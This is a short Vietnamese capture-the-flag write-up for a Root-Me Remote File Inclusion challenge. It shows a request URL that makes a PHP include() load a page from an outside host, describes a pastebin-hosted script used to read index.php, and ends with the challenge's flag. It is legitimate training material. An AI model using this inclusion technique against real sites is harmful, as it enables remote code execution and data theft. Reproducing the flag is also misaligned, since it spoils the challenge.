# Write up challenge Remote File Inclusion


Tác giả:
- **Nguyễn Mỹ Quỳnh** <br>

  
[Link Challenge](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)<br>
</br>

Yêu cầu của challenge 

<img src="./img/1.png" alt="normal_acc_TRAbID"/>

Thử một giá trị khác cho tham số `lang`. Ta thấy code sử dụng hàm `include()` và nối thêm `_lang.php` vào phía sau.

<img src="./img/2.png" alt="normal_acc_TRAbID"/>

Dựa vào tên challenge ta thực hiện khai thác RFI. Thử include 1 file từ website khác:

        http://challenge01.root-me.org/web-serveur/ch13/?lang=https://vnexpress.net/?

<img src="./img/3.png" alt="normal_acc_TRAbID"/>

Thành công! Ok bây giờ ta sẽ viết 1 đoạn code đơn giản từ trang https://pastebin.com/ để get nội dung file index.php:

<img src="./img/4.png" alt="normal_acc_TRAbID"/>      

Copy đường dẫn past vào và xem kết quả. Có một chút thay đổi là 2 trang Français | English xuất hiện 2 lần.

<img src="./img/5.png" alt="normal_acc_TRAbID"/>      

Inspect xem thử ta thấy flag:

<img src="./img/6.png" alt="normal_acc_TRAbID"/>      

Có được flag. Submit thành công 

<img src="./img/7.png" alt="normal_acc_TRAbID"/>

<br><br>

> **Flag:** R3m0t3_iS_r3aL1y_3v1l

